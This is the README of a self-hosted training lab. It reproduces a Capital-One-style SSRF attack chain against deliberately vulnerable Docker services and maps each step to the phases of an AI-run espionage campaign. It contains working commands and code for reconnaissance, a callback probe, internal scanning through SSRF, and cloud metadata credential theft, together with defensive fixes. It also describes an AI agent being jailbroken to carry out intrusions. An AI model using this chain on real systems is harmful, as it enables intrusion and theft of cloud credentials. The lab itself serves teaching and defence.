# SSRF kill-chain lab: turning an abstract attack lifecycle into runnable code

This is a small, self-contained lab that takes the **five-phase attack lifecycle** described in a
real 2025 incident report and makes every phase concrete — with real tools, a real class of
vulnerability, and real commands and output. If you have ever read an attack write-up that lists
"reconnaissance → vulnerability discovery → exploitation → foothold → post-exploitation" and found
those words too abstract to picture, this lab is meant to fix that.

Everything runs on your own machine inside an isolated Docker network, against deliberately
vulnerable services that this lab ships. **It is an authorized, legal learning environment** — the
same idea as picoCTF or HackTheBox, just self-hosted. Every command and every block of output
below was captured from a real run (2026-09-28); the raw logs are in [`output/`](output/).

> **Background — what "GTG-1002" and "Task 1-5" refer to below.** In November 2025 Anthropic
> disclosed *GTG-1002*, the first documented large-scale cyber-espionage campaign in which an AI
> agent (a jailbroken Claude Code) autonomously executed ~80-90% of the attack. Anthropic's report
> broke the campaign into a six-phase task table. This lab reproduces the *structure* of that
> lifecycle on a safe target, so the abstract phases become something you can run. Anthropic's
> original report is included at [`../../reports/`](../../reports/); you do not need to have read it
> first — this README is self-contained.

---

## 0. Why SSRF? It's the vulnerability class GTG-1002 called out

In Anthropic's task breakdown, Phase 2 was **"identified an SSRF vulnerability."** That is not an
arbitrary example. SSRF is the single most representative "break into a cloud internal network"
vulnerability of the past several years. The most famous real case is the **2019 Capital One
breach** (personal data of ~100 million Americans and ~6 million Canadians): an attacker used an
SSRF in a web-application firewall to make the server request AWS's cloud metadata endpoint at
`169.254.169.254`, stole the temporary IAM credentials of the server's role, and used those
credentials to read S3 storage buckets.

**SSRF (Server-Side Request Forgery), in one sentence:** an application has a feature that "fetches
a URL for you" (URL previews, image imports, webhook testers), but doesn't validate the
destination. An attacker swaps in an **internal** address, so the server makes the request on the
attacker's behalf — reaching **internal systems the attacker could never reach directly**,
including the cloud metadata endpoint.

This lab reproduces that Capital-One-style chain end to end.

---

## 1. The lab environment (a self-built target range)

Three services run on an isolated Docker network called `cyberlab`. All three are written in pure
Python standard library — the code in [`services/`](services/) is short enough to read line by line:

| Service | Role | Reachable by the attacker? |
|---|---|---|
| **ssrf-app** (LinkPeek, port 8888) | A public web app with a "URL preview" feature `/preview?url=` — **this is where the SSRF is** | ✅ the only entry point exposed to the attacker |
| **internal-api** | An internal admin API, **no authentication** (it assumes "only the internal network can reach me") | ❌ not published to a host port |
| **metadata** | A fake cloud metadata service mimicking AWS `169.254.169.254`, returning fake temporary IAM credentials | ❌ not published to a host port |

**The key design point — the thing that makes SSRF dangerous** — is visible in the `docker ps`
port column (real output):

```
NAMES          PORTS
ssrf-app       0.0.0.0:8888->80/tcp     <- only this one is exposed
internal-api                            <- no port; the host cannot reach it
metadata                                <- no port; the host cannot reach it
```

Network topology:

```
attacker (your host) --> ssrf-app :8888   (the only entry point)
                            |  SSRF: fetches any URL on your behalf
                            +--> internal-api   (internal admin API, no auth)
                            +--> metadata        (fake cloud metadata, holds the credentials)
```

**First, confirm the premise holds:** the attacker cannot reach the internal services directly —

```
$ curl -m 4 "http://metadata.internal/latest/meta-data/"
curl: (6) could not resolve host: metadata.internal   <- the attacker can't even resolve this internal name
```

The internal systems are invisible and unreachable to the attacker. **The only way in is to pivot
through ssrf-app's SSRF.** The five tasks below are how that pivot is done.

---

## 2. Task 1 — Discovery: scan, enumerate, map the attack surface

**Tool: nmap** (service/version detection against the only visible target). Real command + key
output:

```
$ nmap -sV -Pn -p 8888 localhost
PORT     STATE SERVICE         VERSION
8888/tcp open  sun-answerbook?      <- nmap can't name it, but the fingerprint gives it away:
  HTTP/1.0 200 OK
  Server: LinkPeek/1.3.0 Python/3.11.16
  <title>LinkPeek - URL Preview Service</title>
  <form action="/preview" ...><input name="url" ...>   <- attack surface: a "URL preview" form
```

nmap immediately reveals: this host runs an HTTP service called LinkPeek with a `/preview` endpoint
that takes a `url` parameter. **"Take a URL and have the server fetch it" is the textbook SSRF
suspect (the sink).**

Grab `robots.txt` too (real sites often leak paths this way) — it volunteers more of the attack
surface:

```
$ curl http://localhost:8888/robots.txt
Disallow: /preview
Disallow: /internal-notes.txt          <- follow the thread

$ curl http://localhost:8888/internal-notes.txt
TODO(devops): the preview fetcher can reach the internal admin API and the
cloud metadata service. Lock down egress before GA.   <- a clue the developers left behind
```

> **Maps to GTG-1002:** Task 1 — "scan the target infrastructure · enumerate services and
> endpoints · map the attack surface." In a real campaign this step runs nmap / browser automation
> across hundreds of endpoints; here it's condensed to a single target, but the action is the same.

---

## 3. Task 2 — Vulnerability analysis: confirm this really is an SSRF

**The question:** how do you prove `/preview` fetches server-side (SSRF), rather than in your own
browser? Two independent pieces of evidence.

**Evidence 1 (in-band, read the response):** point it at a hostname that **only the server's
internal network can resolve**, `metadata.internal`:

```
$ curl "http://localhost:8888/preview?url=http://metadata.internal/"
ami-id
hostname
iam/
instance-id            <- the app successfully resolved and fetched this internal name
```

The attacker's own `curl metadata.internal` returns "could not resolve host" (proven above), yet
`/preview` returns the content — **so the fetch happened on the server's side. SSRF confirmed.**

**Evidence 2 (out-of-band callback, works even when the attack is "blind"):** this corresponds to
what Anthropic described in GTG-1002 as **"validating the exploit via callback responses."** Start a
listener you control and have the app fetch it:

```
# on the attacker's machine, start a listener (exploit/callback_server.py)
[callback] listening on 0.0.0.0:9000 — waiting for the target to call home

# make the SSRF hit that callback URL
$ curl "http://localhost:8888/preview?url=http://host.docker.internal:9000/ssrf-probe-abc123"

# the listener received a real inbound request (real output):
[callback] 16:16:17  INBOUND HIT from 127.0.0.1  path=/ssrf-probe-abc123  UA=LinkPeek-preview/1.3
```

The point: **even if the app returns nothing useful to you (blind SSRF), an inbound request to your
listener carrying the `LinkPeek-preview` User-Agent proves the server made a request for you.** This
is exactly why GTG-1002's operators validated exploits with an independent callback service rather
than trusting the tool's own claim of success — the case study notes that Claude frequently
*overstated* success, so every result had to be independently verified.

> **Maps to GTG-1002:** Task 2 — "identify an SSRF vulnerability · research exploitation
> techniques."

---

## 4. Task 3 — Exploit development: weaponize the single SSRF primitive into an internal port scanner

At this point there is exactly one capability: `ssrf(url)` = make the app fetch any URL. **Task 3
is turning that one primitive into a complete exploitation chain.** The first move is to use it as
an **internal scanner** — probe internal hosts/ports one by one and read the app's response to tell
which are alive:

```
$ python exploit_chain.py   (excerpt: Task 3 real output)
[*] Sweeping internal hostnames/ports through the SSRF sink...
    LIVE  http://internal-api:80/           {"service":"internal-admin-api","version":"2.1"...
    LIVE  http://admin.internal:80/         {"service":"internal-admin-api"...     <- an alias of the same host
    LIVE  http://metadata.internal:80/      ami-id hostname iam/ instance-id
    DEAD  http://internal-api:9999/         (HTTPError, port closed)
    LIVE  http://localhost:80/              <!doctype html>...LinkPeek...          <- the server itself
[+] Live internal targets discovered: 4
```

The core exploit is just a few lines ([`exploit/exploit_chain.py`](exploit/exploit_chain.py)) —
**the entire "weapon" is essentially this one function:**

```python
def ssrf(target_url):
    # Make the vulnerable app fetch target_url for us and return what it got.
    # This one primitive IS the whole vulnerability; everything downstream is just
    # choosing clever values of target_url.
    q = urllib.parse.urlencode({"url": target_url})
    req = urllib.request.Request(f"http://localhost:8888/preview?{q}")
    with urllib.request.urlopen(req, timeout=8) as r:
        return r.read().decode(errors="replace")
```

> **Maps to GTG-1002:** Task 3 — "write a custom payload · develop the full exploit chain · validate
> via callback · generate an exploitation report." Here the "custom payload" is a carefully chosen
> `target_url`; "callback validation" is Evidence 2 above; the scan results are the "report."

---

## 5. Task 4 — Exploit delivery: reach the internal admin API for initial access

The internal admin API **has no host port; the attacker cannot connect to it directly.** But
delivering the request through the SSRF works (real output):

```
$ python exploit_chain.py   (excerpt: Task 4)
[*] The admin API has NO host port. Reaching it directly is impossible.
    Delivering the request THROUGH the SSRF instead:

    GET http://internal-api/  ->
    {
      "service": "internal-admin-api",
      "version": "2.1",
      "auth": "none (internal network only)",     <- no auth, because it assumes "only the internal network can reach me"
      "endpoints": ["/admin/users", "/admin/config"]
    }
[+] Foothold established: we can now drive the internal admin API at will.
```

This is the **foothold**: a system that was completely unreachable is now something the attacker can
drive freely. The reason it has no defenses is precisely the "internal network = trusted"
assumption that SSRF shatters.

> **Maps to GTG-1002:** Task 4 — "deploy the exploit to gain initial access · establish a foothold
> in the environment."

---

## 6. Task 5 — Post-exploitation: enumerate internal systems, take the admin interface, steal cloud metadata credentials

With a foothold, the looting begins. All three actions go through the same SSRF primitive (real
output excerpts):

**(1) Enumerate the internal admin interface (list users):**
```
GET http://internal-api/admin/users  ->
  svc-deploy (admin, CI/CD service account)
  j.reyes    (operator, on-call)
  backup     (readonly, nightly dumps)
```

**(2) Read internal config (contains an internal flag):**
```
GET http://internal-api/admin/config  ->
  db_host: db.internal:5432
  internal_flag: LAB{ssrf_pivot_to_internal_admin_api}
```

**(3) The main event — point the SSRF at the cloud metadata endpoint and steal temporary IAM
credentials** (in real AWS this is `http://169.254.169.254/`):
```
Step A: list the IAM role bound to the instance
  GET .../iam/security-credentials/  ->  linkpeek-app-ec2-role

Step B: fetch that role's temporary credentials
  GET .../iam/security-credentials/linkpeek-app-ec2-role  ->
  {
    "AccessKeyId":     "AKIAFAKELABEXAMPLE01",
    "SecretAccessKey": "wJalrXUtnFEMI/FAKE/LAB/...",
    "Token":           "FQoGZXIvYXdz...",
    "Expiration":      "2026-09-29T04:00:00Z"
  }
```

**The whole chain in a single command** (one curl that captures the entire problem):

```
$ curl "http://localhost:8888/preview?url=http://metadata.internal/latest/meta-data/iam/security-credentials/linkpeek-app-ec2-role"
{ "AccessKeyId": "AKIAFAKELABEXAMPLE01", "SecretAccessKey": "...", "Token": "...", ... }
```

In the real world, the attacker would next use these keys from **their own machine** to call the
cloud API (`aws s3 ls`, etc.) and download storage buckets — **this is the complete Capital One 2019
mechanism.** The credentials here are fake and exist only inside this lab.

> **Maps to GTG-1002:** Task 5 — "enumerate internal services · identify admin interfaces · discover
> metadata endpoints." In the case study, Claude autonomously ran "authenticate → query → extract →
> create a backdoor → package → categorize," which is structurally identical to this.

---

## 7. At a glance: this lab ↔ GTG-1002's five phases

| GTG-1002 Task (Anthropic's wording) | What this lab actually does | Tools / code |
|---|---|---|
| **1** scan infrastructure · enumerate endpoints · map attack surface | nmap against 8888, grab robots.txt / internal-notes | `nmap`, `curl`, [`exploit/recon.sh`](exploit/recon.sh) |
| **2** identify SSRF · research exploitation | in-band (fetch an internal name) + out-of-band callback, two confirmations | [`exploit/callback_server.py`](exploit/callback_server.py), `curl` |
| **3** write payload · develop chain · validate via callback · report | weaponize the `ssrf()` primitive into an internal port scanner | the `ssrf()` function in [`exploit/exploit_chain.py`](exploit/exploit_chain.py) |
| **4** deploy exploit · gain initial access · establish foothold | drive the unauthenticated internal admin API through SSRF | `exploit_chain.py` Task 4 |
| **5** enumerate internal · identify admin interfaces · discover metadata endpoints | list users/config + steal cloud metadata IAM credentials | `exploit_chain.py` Task 5 |

---

## 8. The defender's view (how a blue team stops this)

Every link in this chain has a corresponding fix; understanding the defense deepens the
understanding of the vulnerability:

- **Root cause (Task 2):** `/preview` should **allowlist** destination URLs (only permit a set of
  known domains) and **block internal / link-local ranges** (`169.254.0.0/16`, `10.0.0.0/8`, etc.).
- **Cloud metadata:** upgrade to **IMDSv2**, which requires a token-bearing PUT preflight that SSRF
  can rarely satisfy — this is exactly what AWS pushed after Capital One.
- **Internal services:** don't assume "internal = trusted" (zero trust); internal APIs need
  authentication too. This is a direct application of the "defense in layers" section of the parent
  deck (`../../` §6).
- **Egress restriction:** an application server shouldn't be able to freely reach the metadata
  endpoint or the internal admin plane — which is exactly what that `internal-notes.txt` devops TODO
  was warning about.

---

## 9. Going deeper: authoritative real-world resources

- **PortSwigger Web Security Academy — SSRF** (free interactive labs, widely regarded as the best
  starting point): https://portswigger.net/web-security/ssrf
- **HackTricks — SSRF** (a compendium of exploitation techniques, including each cloud's metadata
  endpoints): https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- **OWASP — Server Side Request Forgery**: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **Capital One 2019 breach technical retrospective** (the real-world prototype for this lab):
  https://www.capitalone.com/digital/facts2019/ · analysis: https://www.nojones.net/posts/exploring-the-capital-one-breach
- **AWS IMDSv2** (the defense for the metadata endpoint):
  https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- **PayloadsAllTheThings — SSRF** (payload cheat sheet):
  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

## 10. Reproduce it

Run these from this lab's own directory (the one containing this README):

```bash
# 0. isolated network (if it doesn't exist yet)
docker network create cyberlab 2>/dev/null || true

# 1. start the target range (three services, pure stdlib, no pip needed)
docker compose up -d

# 2. Task 1: external scan  (needs nmap: e.g. `brew install nmap` or `apt install nmap`)
bash exploit/recon.sh localhost 8888

# 3. start the callback listener for Task 2's out-of-band check (in a second terminal)
python3 exploit/callback_server.py 9000

# 4. run the full Task 1-5 chain
python3 exploit/exploit_chain.py --callback host.docker.internal:9000

# 5. tear down
docker compose down
```

**Environment:** developed on macOS + Docker Desktop (arm64; target image `python:3.11-slim`).
`host.docker.internal` (used for the callback in step 4) resolves out of the box on Docker Desktop
for Mac/Windows; on Linux, run the container with `--add-host=host.docker.internal:host-gateway` or
substitute your host's LAN IP. The [`output/`](output/) directory contains the full captured output
from a real run (`task1_nmap.txt`, `full_chain.txt`, `callback.log`, `oneliner_creds.txt`,
`topology.txt`) so you can compare against your own.

**Boundary reminder:** these tools (nmap, curl, the scripts here) may only be pointed at **a target
range you built yourself** or at **an authorized environment such as picoCTF / HackTheBox**. Running
them against systems you don't own or aren't authorized to test is a computer crime in nearly every
jurisdiction.
